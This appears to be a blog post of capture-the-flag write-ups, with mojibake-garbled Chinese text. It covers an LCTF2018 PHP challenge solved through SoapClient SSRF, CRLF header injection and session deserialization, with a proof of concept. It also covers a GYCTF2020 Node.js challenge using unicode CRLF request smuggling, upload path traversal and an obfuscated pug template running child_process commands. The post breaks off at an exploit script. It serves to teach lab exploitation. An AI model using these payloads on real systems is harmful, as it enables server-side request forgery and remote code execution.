

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="Yu ting">
  <meta name="keywords" content="">
  <title>buuï¼ˆåä¸€ï¼‰ - liquor&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
  



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- è‡ªå®šä¹‰æ ·å¼ä¿æŒåœ¨æœ€åº•éƒ¨ -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"liquor-boop.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="liquor's blog" type="application/atom+xml">
</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="buuï¼ˆåä¸€ï¼‰">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-08-21 16:58" pubdate>
        August 21, 2021 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      2.3k å­—
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      30
       åˆ†é’Ÿ
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">buuï¼ˆåä¸€ï¼‰</h1>
            
            <div class="markdown-body">
              <h1>bestphpâ€™s revenge</h1>
<h4 id="åˆ©ç”¨PHPåŸç”Ÿç±»æ¥æ„é€ POPé“¾"><a class="header-anchor" href="#åˆ©ç”¨PHPåŸç”Ÿç±»æ¥æ„é€ POPé“¾">ğŸ­</a>åˆ©ç”¨PHPåŸç”Ÿç±»æ¥æ„é€ POPé“¾</h4>
<p>åœ¨æ²¡æœ‰å¯ä»¥åˆ©ç”¨ç±»çš„æƒ…å†µä¸‹ï¼Œå°±æ‰¾ä¸åˆ°POPé“¾æ‰€ä»¥åªèƒ½è€ƒè™‘PHPåŸç”Ÿç±»ï¼Œä¹‹å‰è¿ç”¨çš„éƒ½æ˜¯phpçš„ä¸€äº›é­”æœ¯æ–¹æ³•ï¼Œä½†phpä¼šä½¿ç”¨äº†<code>zend_class_unserialize_deny</code>æ¥ç¦æ­¢ä¸€äº›ç±»çš„ååºåˆ—åŒ–ï¼Œæ­¤æ—¶å°±éœ€è¦åŸç”Ÿç±»ã€‚</p>
<p>SOAPï¼ˆç®€å•å¯¹è±¡è®¿é—®åè®®ï¼‰æ˜¯è¿æ¥æˆ–WebæœåŠ¡æˆ–å®¢æˆ·ç«¯å’ŒWebæœåŠ¡ä¹‹é—´çš„æ¥å£ã€‚å…¶é‡‡ç”¨HTTPä½œä¸ºåº•å±‚é€šè®¯åè®®ï¼ŒXMLä½œä¸ºæ•°æ®ä¼ é€çš„æ ¼å¼ã€‚SOAPæ¶ˆæ¯åŸºæœ¬ä¸Šæ˜¯ä»å‘é€ç«¯åˆ°æ¥æ”¶ç«¯çš„å•å‘ä¼ è¾“ï¼Œä½†å®ƒä»¬å¸¸å¸¸ç»“åˆèµ·æ¥æ‰§è¡Œç±»ä¼¼äºè¯·æ±‚ / åº”ç­”çš„æ¨¡å¼ã€‚</p>
<p><strong>SoapClient</strong>æ˜¯ä¸€ä¸ªphpå†…ç½®çš„ç±»ï¼Œå½“__callæ–¹æ³•è¢«è§¦å‘åï¼Œå®ƒå¯ä»¥å‘é€HTTPå’ŒHTTPSè¯·æ±‚ã€‚è¯¥ç±»çš„æ„é€ å‡½æ•°å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs lasso"><span class="hljs-keyword">public</span> SoapClient <span class="hljs-type">:: SoapClient</span> ï¼ˆmixed $wsdl <span class="hljs-meta">[</span>ï¼Œ<span class="hljs-built_in">array</span> $options <span class="hljs-meta">]</span>ï¼‰</code></pre>
<p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯wsdlæ¨¡å¼ã€‚</p>
<p>ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œuri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚<br>
çŸ¥é“ä¸Šè¿°ä¸¤ä¸ªå‚æ•°çš„å«ä¹‰åï¼Œå°±å¾ˆå®¹æ˜“æ„é€ å‡ºSSRFçš„åˆ©ç”¨payloadäº†ã€‚æˆ‘ä»¬å¯ä»¥è®¾ç½®ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºnullï¼Œç„¶åç¬¬äºŒä¸ªå‚æ•°çš„locationé€‰é¡¹è®¾ç½®ä¸ºtarget_url</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$a = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-string">&quot;http://127.0.0.1/flag.php&quot;</span>,
                                 <span class="hljs-string">&#x27;uri&#x27;</span>=&gt; <span class="hljs-string">&quot;123&quot;</span>));
<span class="hljs-keyword">echo</span> urlencode(serialize($a));
<span class="hljs-meta">?&gt;</span></code></pre>
<p>åºåˆ—åŒ–åï¼Œè¿›è¡Œurlç¼–ç ï¼Œæ˜¯ä¸ºäº†é˜²æ­¢åŒå¼•å·å¸¦æ¥çš„çƒ¦æ¼ã€‚</p>
<p>è¯¦è§ï¼š<a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">ååºåˆ—åŒ–ä¹‹PHPåŸç”Ÿç±»çš„åˆ©ç”¨</a></p>
<h4 id="call-user-func"><a class="header-anchor" href="#call-user-func">ğŸ­</a>call_user_func()</h4>
<p>å½“ä¼ å…¥çš„å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä¸”æ•°ç»„çš„ç¬¬ä¸€ä¸ªå€¼æ˜¯ä¸€ä¸ªç±»çš„åå­—ï¼Œæˆ–ä¸€ä¸ªå¯¹è±¡ï¼Œå°±ä¼šæŠŠæ•°ç»„çš„ç¬¬äºŒä¸ªå€¼å½“åšæ–¹æ³•æ‰§è¡Œã€‚</p>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
highlight_file(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fun</span></span>&#123;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params">$a,$b</span>)</span>&#123;  \\å½“è°ƒç”¨çš„æ–¹æ³•ä¸å­˜åœ¨æ—¶ï¼Œæ‰§è¡Œ
        <span class="hljs-keyword">echo</span> <span class="hljs-number">11</span>;
    &#125;
&#125;
$a = <span class="hljs-keyword">new</span> fun();
call_user_func(<span class="hljs-keyword">array</span>($a,<span class="hljs-string">&quot;aaaas&quot;</span>));

<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">#outcomeï¼š11</span></code></pre>
<h4 id="CRLF-Injection"><a class="header-anchor" href="#CRLF-Injection">ğŸ­</a>CRLF Injection</h4>
<p>CRLFæ˜¯â€å›è½¦+æ¢è¡Œâ€ï¼ˆ\r\nï¼‰çš„ç®€ç§°ã€‚åœ¨HTTPåè®®ä¸­ï¼ŒHTTPHeaderä¸HTTPBodyæ˜¯ç”¨ä¸¤ä¸ªCRLFåˆ†éš”çš„ï¼Œæµè§ˆå™¨å°±æ˜¯æ ¹æ®è¿™ä¸¤ä¸ªCRLFæ¥å–å‡ºHTTPå†…å®¹å¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚ä¸€æ—¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶HTTPæ¶ˆæ¯å¤´ä¸­çš„å­—ç¬¦ï¼Œæ³¨å…¥ä¸€äº›æ¶æ„çš„æ¢è¡Œï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½æ³¨å…¥ä¸€äº›ä¼šè¯Cookieæˆ–è€…HTMLä»£ç ï¼Œæ‰€ä»¥CRLFInjectionåˆå«HTTPResponseSplittingï¼Œç®€ç§°HRSã€‚æ‰€ä»¥ï¼Œå½“æˆ‘ä»¬å¯ä»¥æ§åˆ¶User-Agentçš„å€¼æ—¶ï¼Œå¤´éƒ¨å¯æ§ï¼Œå°±å¯ä»¥æ³¨å…¥crlfå®ç°ä¿®æ”¹httpè¯·æ±‚åŒ…ã€‚</p>
<h4 id="serialize-handerå¤„ç†sessionæ–¹å¼ä¸åŒå¯¼è‡´sessionæ³¨å…¥"><a class="header-anchor" href="#serialize-handerå¤„ç†sessionæ–¹å¼ä¸åŒå¯¼è‡´sessionæ³¨å…¥">ğŸ­</a>serialize_handerå¤„ç†sessionæ–¹å¼ä¸åŒå¯¼è‡´sessionæ³¨å…¥</h4>
<p>serialize_handler=phpï¼šæŒ‡å®šphpåºåˆ—åŒ–å¼•æ“ï¼›<br>
phpä¸­çš„sessionä¸­çš„å†…å®¹æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥å­˜å‚¨çš„ï¼Œå­˜å‚¨æ–¹å¼å°±æ˜¯ç”±é…ç½®é¡¹session.save_handleræ¥è¿›è¡Œç¡®å®šï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ã€‚å­˜å‚¨çš„æ–‡ä»¶æ˜¯ä»¥sess_sessionidæ¥è¿›è¡Œå‘½åçš„ï¼Œæ–‡ä»¶çš„å†…å®¹å°±æ˜¯sessionå€¼çš„åºåˆ—åŒ–ä¹‹åçš„å†…å®¹ã€‚<br>
åœ¨php.iniä¸­å­˜åœ¨ä¸‰é¡¹é…ç½®é¡¹ï¼š</p>
<pre><code class="hljs pgsql"><span class="hljs-keyword">session</span>.save_path=&quot;&quot;   <span class="hljs-comment">--è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„</span>
<span class="hljs-keyword">session</span>.save_handler=&quot;&quot; <span class="hljs-comment">--è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®ä¼šè¯å­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨æœ¬å‡½æ•°(æ•°æ®åº“ç­‰æ–¹å¼)</span>
<span class="hljs-keyword">session</span>.serialize_handler   string <span class="hljs-comment">--å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤æ˜¯php(5.5.4åæ”¹ä¸ºphp_serialize)</span></code></pre>
<p>session.serialize_handlerå­˜åœ¨ä»¥ä¸‹å‡ ç§</p>
<table>
<thead>
<tr>
<th style="text-align:center">å¤„ç†å™¨</th>
<th style="text-align:center">å¯¹åº”çš„å­˜å‚¨æ ¼å¼</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">php</td>
<td style="text-align:center">é”®å + ç«–çº¿ + ç»è¿‡serialize()å‡½æ•°ååºåˆ—åŒ–å¤„ç†çš„å€¼</td>
</tr>
<tr>
<td style="text-align:center">php_binary</td>
<td style="text-align:center">é”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦ + é”®å + ç»è¿‡serialize()å‡½æ•°ååºåˆ—åŒ–å¤„ç†çš„å€¼</td>
</tr>
<tr>
<td style="text-align:center">php_serialize(php&gt;=5.5.4)</td>
<td style="text-align:center">ç»è¿‡serialize()å‡½æ•°ååºåˆ—å¤„ç†çš„æ•°ç»„</td>
</tr>
</tbody>
</table>
<p>åœ¨PHPä¸­é»˜è®¤ä½¿ç”¨çš„æ˜¯PHPå¼•æ“ï¼Œå¦‚æœè¦ä¿®æ”¹ä¸ºå…¶ä»–çš„å¼•æ“ï¼Œæ·»åŠ </p>
<pre><code class="hljs less"><span class="hljs-selector-tag">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;éœ€è¦è®¾ç½®çš„å¼•æ“&#x27;</span>);</code></pre>
<p>å½“ä¼ å…¥<code>$_SESSION['name']='|O:5:&quot;xxxxx&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;'; </code>åºåˆ—åŒ–å¼•æ“ä½¿ç”¨çš„æ˜¯php_serializeï¼Œé‚£ä¹ˆå‚¨å­˜çš„sessionæ–‡ä»¶ä¸º<code>a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;|O:5:&quot;xxxxx&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&quot;;&#125;</code>è€Œååºåˆ—åŒ–å¼•æ“å¦‚æœä½¿ç”¨çš„æ˜¯phpï¼Œå°±ä¼šæŠŠ|ä½œä¸ºä½œä¸ºkeyå’Œvalueçš„åˆ†éš”ç¬¦ã€‚æŠŠa:1:{s:4:â€œnameâ€;s:5:&quot;å½“ä½œé”®åï¼Œè€ŒæŠŠO:5:â€œxxxxxâ€:1:{s:4:â€œtestâ€;s:3:â€œAAAâ€;}å½“ä½œç»è¿‡serialize()å‡½æ•°å¤„ç†è¿‡çš„å€¼ï¼Œæœ€åä¼šæŠŠå®ƒè¿›è¡Œunserializeå¤„ç†ï¼Œæ­¤æ—¶å°±æ„æˆäº†ä¸€æ¬¡ååºåˆ—åŒ–æ³¨å…¥æ”»å‡»ã€‚</p>
<h4 id="è§£é¢˜"><a class="header-anchor" href="#è§£é¢˜">ğŸ­</a>è§£é¢˜</h4>
<p>é¢˜ç›®ç»™äº†æºç </p>
<pre><code class="hljs php"><span class="hljs-comment">//index.php</span>
<span class="hljs-meta">&lt;?php</span>
highlight_file(<span class="hljs-keyword">__FILE__</span>);
$b = <span class="hljs-string">&#x27;implode&#x27;</span>;
call_user_func($_GET[f],$_POST);
session_start();
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[name]))&#123;
    $_SESSION[name] = $_GET[name];
&#125;
var_dump($_SESSION);
$a = <span class="hljs-keyword">array</span>(reset($_SESSION),<span class="hljs-string">&#x27;welcome_to_the_lctf2018&#x27;</span>);
call_user_func($b,$a);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>flag.php</p>
<pre><code class="hljs sqf"><span class="hljs-comment">//flag.php</span>
session_start();
<span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;only localhost can get flag!&#x27;</span>;
$<span class="hljs-built_in">flag</span> = <span class="hljs-string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>;
<span class="hljs-keyword">if</span>($<span class="hljs-variable">_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;
       $<span class="hljs-variable">_SESSION</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] = $<span class="hljs-built_in">flag</span>;
   &#125;
only localhost can get <span class="hljs-built_in">flag</span>!</code></pre>
<p>å¯ä»¥æ„é€ ssrfå»è®¿é—®flag.phpï¼Œç„¶åè·å–flagã€‚å†åˆ©ç”¨å˜é‡è¦†ç›–æŠŠSESSIONä¸­çš„flagæ‰“å°å‡ºæ¥ã€‚</p>
<p>POC</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$target = <span class="hljs-string">&quot;http://127.0.0.1/flag.php&quot;</span>;
$attack = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; $target,
    <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;N0rth3ty\r\nCookie: PHPSESSID=g6ooseaeo905j0q4b9qqn2n471\r\n&quot;</span>,
    <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&quot;123&quot;</span>));
$payload = urlencode(serialize($attack));
<span class="hljs-keyword">echo</span> $payload;</code></pre>
<p>å¤§ä½“å°±æ˜¯:sessionååºåˆ—åŒ–-&gt;soap(ssrf+crlf)-&gt;call_user_funcæ¿€æ´»soapç±»</p>
<h5 id="æ³¨å…¥pocå¾—åˆ°çš„session"><a class="header-anchor" href="#æ³¨å…¥pocå¾—åˆ°çš„session">ğŸ­</a>æ³¨å…¥pocå¾—åˆ°çš„session</h5>
<p><img src="/2021/08/21/up/2.png" srcset="/img/loading.gif" alt="2"></p>
<p>åˆ©ç”¨<code>call_user_func($_GET[â€˜fâ€™], $_POST);</code>æ”¹å˜åºåˆ—åŒ–å¼•æ“ä¸ºphp_serializeï¼Œ<code>$_SESSION[â€˜nameâ€™] = $_GET[â€˜nameâ€™];</code>å°†åºåˆ—åŒ–å¯¹è±¡ä¼ å…¥sessionä¸­ï¼Œå¹¶åœ¨å‰é¢åŠ ä¸€ä¸ªâ€œ|â€,æ­¤æ—¶sessionä¼šä»¥php_serializeçš„è§„åˆ™å‚¨å­˜.</p>
<h5 id="è§¦å‘ååºåˆ—åŒ–ä½¿SoapClientå‘é€è¯·æ±‚"><a class="header-anchor" href="#è§¦å‘ååºåˆ—åŒ–ä½¿SoapClientå‘é€è¯·æ±‚">ğŸ­</a>è§¦å‘ååºåˆ—åŒ–ä½¿SoapClientå‘é€è¯·æ±‚</h5>
<p><img src="/2021/08/21/up/3.png" srcset="/img/loading.gif" alt="3"></p>
<p><code>call_user_func($_GET[â€˜fâ€™], $_POST); </code>å°†bå˜é‡ç”¨extractå‡½æ•°è¦†ç›–ä¸ºcall_user_funcã€‚æ­¤æ—¶çš„åºåˆ—åŒ–å¼•æ“ä¸ºphpï¼Œæ­¤å‡½æ•°ä¼šæŒ‰ç…§phpçš„æ–¹æ³•æŠŠåˆšæ‰ä¼ å…¥çš„sessionï¼Œè¿›è¡Œååºåˆ—åŒ–å‚¨å­˜åœ¨sessionä¸­ã€‚</p>
<p><code>$a = array(reset($_SESSION), â€˜welcome_to_the_lctf2018â€™); </code>æŠŠsessionä¸â€œwelcome_to_the_lctf2018â€å’Œå¹¶ä¸ºä¸€ä¸ªæ•°ç»„ã€‚</p>
<p>æ­¤æ—¶<code>call_user_func($b, $a);</code> çš„$bå˜é‡å·²ç»è¢«è¦†ç›–æˆäº†call_user_funcï¼Œæ­¤æ—¶çš„ç¨‹åºå°±å˜æˆäº†<code>call_user_func(call_user_func,array($_session,â€˜welcome_to_the_lctf2018â€™));</code>ã€‚</p>
<p>$_sessionä¼šè°ƒç”¨<code>welcome_to_the_lctf2018</code>è¿™ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œ__callæ–¹æ³•è¢«è§¦å‘ï¼ŒæœåŠ¡å™¨æºå¸¦æˆ‘ä»¬è®¾ç½®çš„cookieï¼Œå»è®¿é—®flag.phpï¼Œç„¶åæŠŠflagï¼Œå‚¨å­˜åœ¨æ­¤cookieå¯¹åº”çš„sessionä¸­ã€‚</p>
<h5 id="æºå¸¦pocä¸­çš„cookieè®¿é—®å³å¯å¾—åˆ°flag"><a class="header-anchor" href="#æºå¸¦pocä¸­çš„cookieè®¿é—®å³å¯å¾—åˆ°flag">ğŸ­</a>æºå¸¦pocä¸­çš„cookieè®¿é—®å³å¯å¾—åˆ°flag</h5>
<p><img src="/2021/08/21/up/1.png" srcset="/img/loading.gif" alt="1"></p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11515519.html">https://www.cnblogs.com/20175211lyz/p/11515519.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/153065#h2-0">https://www.anquanke.com/post/id/153065#h2-0</a></p>
<h1>[GYCTF2020]Node Game</h1>
<p>é¢˜ç›®ç»™äº†æºç ï¼Œå®¡è®¡å‡ ä¸ªè·¯ç”±ï¼š</p>
<ul>
<li>
<p>/ æ¥å—actionå‚æ•°ã€‚å¦‚æœæ²¡æœ‰å°±é»˜è®¤ä¸ºindex file=dirname+/template/+action+.pug ç„¶åç”¨pugè¿›è¡Œæ¸²æŸ“ã€‚å¯ä»¥ç†è§£ä¸ºæ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ .</p>
</li>
<li>
<p>/file_upload å®šä¹‰äº†åªèƒ½ç”±127.0.0.1è®¿é—®ã€‚å¹¶ä¸”æ˜¯remoteaddressä¸èƒ½ä¼ªé€ ï¼Œå¾—æ‰¾ä¸€ä¸ªSSRFçš„ç‚¹ æ–‡ä»¶ä¸Šä¼ ã€‚ filepath=/uploads/+mimetype+/ è€Œmimetypeå¯æ§ã€‚æˆ‘ä»¬å¯ä»¥è·¨ç›®å½• dir_file=dirname+filepath+filename é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ„é€ ä»»æ„è·¯å¾„æ–‡ä»¶å†™å…¥.</p>
</li>
<li>
<p>/core æ¥å—ä¸€ä¸ªqå‚æ•°ã€‚ç„¶åå¯¹å…¶è¿›è¡Œé»‘åå•æ£€æµ‹ ç„¶åå¯¹qè¾“å…¥çš„å€¼è¿›è¡Œè¯·æ±‚ã€‚</p>
</li>
</ul>
<p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨SSRFä¼ªé€ æœ¬åœ°ipè¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œä¸Šä¼ åŒ…å«å‘½ä»¤æ‰§è¡Œä»£ç çš„pugæ–‡ä»¶åˆ°/templateç›®å½•ä¸‹ï¼Œç„¶åç”¨<code>?action=</code>æ¥åŒ…å«è¯¥æ–‡ä»¶ã€‚å¦‚ä½•ç”¨SSRFæ¥è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œå°±æ¶‰åŠNode jsçš„ç¼–ç å¤„ç†å®‰å…¨é—®é¢˜ï¼Œå¯ä»¥å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2894">å¤§ä½¬çš„æ–‡ç« </a></p>
<p>SSRFçš„æµç¨‹æ˜¯ï¼š</p>
<ul>
<li>Expressè·å–GET query (æ­¤æ—¶urldecodeä¸€æ¬¡)</li>
<li>å°†queryæ‹¼æ¥åˆ°<code>/source?</code>åé¢ï¼Œä¸¢ç»™http.getè¯·æ±‚ï¼Œæ­¤æ—¶ä¼šurlencodeä¸€æ¬¡</li>
<li>CRLFæ³¨å…¥ä¸€ä¸ªPOSTè¯·æ±‚è®¿é—®file_uploadæ¥å£ï¼ŒHTTPåè®®æŠ¥æ–‡çš„æ§åˆ¶å­—ç¬¦éœ€è¦æ˜¯non-encodeçš„</li>
</ul>
<p>å› ä¸ºpayloadæ˜¯åœ¨æœ€å¤–å±‚æŠ¥æ–‡çš„GET queryé‡Œï¼Œæ‰€ä»¥åªèƒ½åˆ©ç”¨node.jsä¸­http.getè½¬ä¹‰unicodeçš„featureæ¥å¤„ç†ç‰¹æ®Šå­—ç¬¦ï¼ŒGETè¯·æ±‚é‡Œæ³¨å…¥<code>\u0120, \u010d, \u010a</code>ç­‰å­—ç¬¦ï¼ŒExpressæ‹¿åˆ°å°±æ˜¯å¯¹åº”unicodeï¼Œäº¤ç»™http.getåˆ™ä¼šè¢«è½¬æ¢ä¸ºå¯¹åº”asciiï¼Œè€Œä¸ä¼šè¢«urlencodeã€‚æ³¨ï¼šç¬¬ä¸€ä¸ªæŠ¥æ–‡éœ€è¦keep-aliveï¼Œé˜²æ­¢è¿æ¥æ–­å¼€</p>
<p>æ³¨å…¥ä¸€ä¸ªPOSTè¯·æ±‚æˆåŠŸåï¼Œéœ€è¦ä¸Šä¼ ä¸€ä¸ªpugæ¨¡ç‰ˆï¼Œæœä¸€ä¸‹pugæ¨¡æ¿å³å¯æ‰¾åˆ°æ ¼å¼ã€‚</p>
<pre><code class="hljs markdown">-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#x27;child<span class="hljs-emphasis">_&#x27;+&#x27;pro&#x27;+&#x27;cess&#x27;)[<span class="hljs-string">&#x27;ex&#x27;+&#x27;ecSync&#x27;</span>](<span class="hljs-link">&#x27;whoami&#x27;</span>).toString()&quot;)</span>
<span class="hljs-emphasis">-return x</span></code></pre>
<p>ä¸Šä¼ åéœ€è¦åŠ è½½æ¨¡æ¿ï¼Œå¯ä»¥çœ‹åˆ°<code>/?action=</code>å¯åŠ è½½ï¼Œä¸è¿‡é™åˆ¶äº†è·¯å¾„ç©¿è¶Šï¼Œè¿™é‡Œå°±å¾ˆåˆ»æ„äº†ã€‚åœ¨ä¸Šä¼ è·¯ç”±é‡Œä¿å­˜äº†ä¸¤æ¬¡ï¼Œä¸€ä¸ªé‡å‘½åäº†ä¿å­˜åœ¨<code>dist</code>ï¼Œå¦ä¸€ä¸ªå‰¯æœ¬ä¿å­˜åœ¨<code>uploads/MIME_TYPE/FILE_NAME</code>ï¼Œåœ¨MIMEé‡Œè·³ä¸€ä¸‹ç›®å½•åˆ°templateå°±è¡Œäº†</p>
<p>å¤§ä½¬çš„EXPï¼š</p>
<pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> requests

